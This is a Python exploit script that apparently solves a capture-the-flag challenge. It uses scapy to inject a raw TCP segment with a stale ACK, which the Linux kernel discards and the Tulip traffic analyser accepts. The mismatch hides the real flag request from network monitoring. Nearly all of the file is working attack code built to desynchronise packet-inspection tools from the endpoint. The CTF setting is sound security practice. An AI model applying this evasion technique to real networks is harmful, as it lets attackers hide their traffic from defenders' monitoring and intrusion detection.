#!/usr/bin/env python3

import json
import os
import socket
import sys
import threading
import time

import requests
from scapy.all import AsyncSniffer, IP, Raw, TCP, conf, send


HOST = os.environ.get("HOST", "2.29.39.4")
PORT = int(os.environ.get("PORT", "1337"))
TOKEN = os.environ.get("TOKEN")
BASE_URL = f"http://{HOST}:{PORT}"
BODY = b'{"supersecretkey":"turip_ip_ip","ip":"1337.0.0.1"}'
CRLF = bytes((13, 10))


def fail(message):
    raise RuntimeError(message)


def local_address():
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((HOST, PORT))
        return probe.getsockname()[0]
    finally:
        probe.close()


def handshake_with_capture():
    source_ip = local_address()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(20)
    sock.bind((source_ip, 0))
    source_port = sock.getsockname()[1]

    conf.verb = 0
    capture = AsyncSniffer(
        filter=f"host {HOST} and tcp and port {source_port}",
    )
    capture.start()
    time.sleep(0.1)
    try:
        sock.connect((HOST, PORT))
    except OSError:
        capture.stop()
        sock.close()
        raise
    time.sleep(0.15)
    capture.stop()

    client_syn = next(
        (
            packet
            for packet in capture.results
            if packet.haslayer(TCP)
            and packet[TCP].sport == source_port
            and packet[TCP].flags.S
            and not packet[TCP].flags.A
        ),
        None,
    )
    server_synack = next(
        (
            packet
            for packet in capture.results
            if packet.haslayer(TCP)
            and packet[TCP].sport == PORT
            and packet[TCP].flags.S
            and packet[TCP].flags.A
        ),
        None,
    )
    if client_syn is None or server_synack is None:
        sock.close()
        fail("could not recover TCP handshake sequence numbers")

    return sock, source_ip, source_port, client_syn[TCP].seq + 1, server_synack[TCP].seq + 1


def make_request(cookie):
    headers = [
        b"POST /get_flag1337 HTTP/1.1",
        f"Host: {HOST}:{PORT}".encode(),
        f"Cookie: turip_session={cookie}".encode(),
        b"Content-Type: application/json",
        f"Content-Length: {len(BODY)}".encode(),
        b"Connection: close",
        b"",
        b"",
    ]
    return CRLF.join(headers) + BODY


def send_hidden_request(cookie):
    sock, source_ip, source_port, sequence, acknowledgement = handshake_with_capture()
    request = make_request(cookie)
    dummy = b"A" * len(request)

    # The ACK is one step behind the server's expected ACK.  Linux TCP drops
    # this payload as an old-ACK segment, while Tulip's reassembler does not
    # validate ACK ranges and consumes it first.
    decoy = (
        IP(src=source_ip, dst=HOST)
        / TCP(
            sport=source_port,
            dport=PORT,
            flags="PA",
            seq=sequence,
            ack=(acknowledgement - 1) & 0xFFFFFFFF,
        )
        / Raw(dummy)
    )
    send(decoy, verbose=0)
    time.sleep(0.08)

    # The kernel still believes no bytes were sent, so this valid copy uses
    # exactly the same sequence range and is accepted by Flask.
    sock.sendall(request)
    response = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        response.extend(chunk)
    sock.close()
    if b"X-Traffic-Barrier:" not in response:
        fail(f"flag endpoint did not return the traffic marker: {response[:300]!r}")
    return bytes(response)


def main():
    if os.geteuid() != 0:
        fail("raw packet injection needs root; run with sudo and preserve TOKEN")
    if not TOKEN or not all(c in "0123456789abcdefABCDEF" for c in TOKEN) or len(TOKEN) > 256:
        fail("set TOKEN to the team hex token from the CTF platform")

    session = requests.Session()
    auth = session.post(
        f"{BASE_URL}/auth",
        json={"token": TOKEN},
        timeout=10,
    )
    if auth.status_code != 200:
        fail(f"authentication failed ({auth.status_code}): {auth.text}")
    cookie = session.cookies.get("turip_session")
    if not cookie:
        fail("authentication succeeded but no turip_session cookie was returned")
    print("[+] authenticated as", auth.json().get("name", "<unknown>"))

    response = send_hidden_request(cookie)
    print("[+] valid request accepted; waiting for Tulip ingestion")
    print(response.split(b"\r\n\r\n", 1)[-1].decode(errors="replace"))

    check_session = requests.Session()
    check_session.cookies.update(session.cookies)
    for attempt in range(12):
        time.sleep(1 if attempt == 0 else 0)
        try:
            checked = check_session.get(
                f"{BASE_URL}/check",
                headers={"Connection": "close"},
                timeout=15,
            )
        except requests.RequestException as exc:
            print(f"[*] /check connection retry: {exc}")
            time.sleep(3)
            continue
        try:
            data = checked.json()
        except ValueError:
            fail(f"/check returned non-JSON HTTP {checked.status_code}: {checked.text[:300]}")
        print(f"[*] /check HTTP {checked.status_code}: {data.get('message', data.get('status'))}")
        if checked.status_code == 200:
            flag = data.get("data", {}).get("flag")
            if not isinstance(flag, str):
                fail("/check succeeded but did not contain a flag")
            print(f"<FLAG>{flag}</FLAG>")
            return
        if checked.status_code not in (429, 503):
            fail(json.dumps(data))
        retry_after = int(checked.headers.get("Retry-After", "10"))
        time.sleep(max(1, retry_after))

    fail("/check did not return the flag before the retry budget expired")


if __name__ == "__main__":
    try:
        main()
    except (OSError, requests.RequestException, RuntimeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(1)
